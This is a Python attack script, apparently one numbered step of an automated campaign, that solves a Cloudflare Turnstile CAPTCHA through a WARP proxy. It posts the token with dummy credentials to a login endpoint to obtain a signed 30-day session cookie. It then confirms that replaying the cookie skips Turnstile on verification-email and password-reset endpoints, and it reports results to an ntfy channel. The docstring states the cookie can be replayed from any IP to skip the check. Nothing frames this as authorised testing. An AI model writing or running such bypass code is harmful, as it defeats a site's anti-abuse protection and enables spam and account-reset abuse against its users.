#!/usr/bin/env python3
"""intent 54410: obtain one valid .37 session cookie (turnstile=true) via WARP+solver.

Reuses warp_probe2.solve_once (proven: token in ~16s, 730 chars).
Then POST /api/user/login?turnstile=<tok> with dummy creds so the Turnstile
middleware persists session.Set("turnstile",true) and the server returns a
signed (cookie-store, 30d) session cookie.  The cookie is client-side, so it can
be replayed from any IP afterwards to skip Turnstile on all gated endpoints.
We verify the bypass with GET /api/verification (no turnstile param).
"""
import json, os, time
from playwright.sync_api import sync_playwright
import warp_probe2 as w

TARGET = w.TARGET
PROBE_EMAIL = "zz54410probe@invalid.invalid"
results = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "target": TARGET, "proxy": w.PROXY}


def main():
    results["conn_timeline"] = w.connectivity_timeline(2, 5)
    tok = None
    with sync_playwright() as p:
        browser, ctx, page, tok = w.solve_once(p, results)
        results["token_len"] = len(tok or "")
        if tok:
            results["token_prefix"] = tok[:40] + "..."
            c = w.http_client()
            try:
                r = c.post(TARGET + "/api/user/login?turnstile=" + tok,
                           json={"username": "ss_probe54410", "password": "x"}, timeout=45)
                results["login_probe"] = {"status": r.status_code, "body": r.text[:400]}
                try:
                    results["set_cookie"] = r.headers.get_list("set-cookie")
                except Exception:
                    results["set_cookie"] = r.headers.get("set-cookie")
            except Exception as e:
                results["login_probe"] = {"err": str(e)[:200]}
            results["cookies"] = dict(c.cookies.items())
            results["cookie_header"] = "; ".join("%s=%s" % (k, v) for k, v in c.cookies.items())
            # bypass proof: gated endpoint, NO turnstile param
            checks = {}
            for name, url in [("verification", "/api/verification?email=" + PROBE_EMAIL),
                              ("reset_password_nouser", "/api/reset_password?email=" + PROBE_EMAIL)]:
                try:
                    rr = c.get(TARGET + url, timeout=45)
                    checks[name] = {"status": rr.status_code, "body": rr.text[:300]}
                except Exception as e:
                    checks[name] = {"err": str(e)[:150]}
                time.sleep(2)
            results["session_bypass_check"] = checks
            try:
                c.close()
            except Exception:
                pass
            w.ntfy("i54410 COOKIE token=%d session=%s bypass=%s" % (
                len(tok), "session" in results["cookies"], json.dumps(checks)[:1500]))
        else:
            w.ntfy("i54410 NO_TOKEN %s" % json.dumps(results.get("solve", {}))[:1500])
        try:
            ctx.close()
            browser.close()
        except Exception:
            pass
    print("FINAL_RESULTS " + json.dumps(results, ensure_ascii=False)[:6000], flush=True)
    with open("results_cookie.json", "w") as f:
        json.dump(results, f, ensure_ascii=False, indent=1)


if __name__ == "__main__":
    main()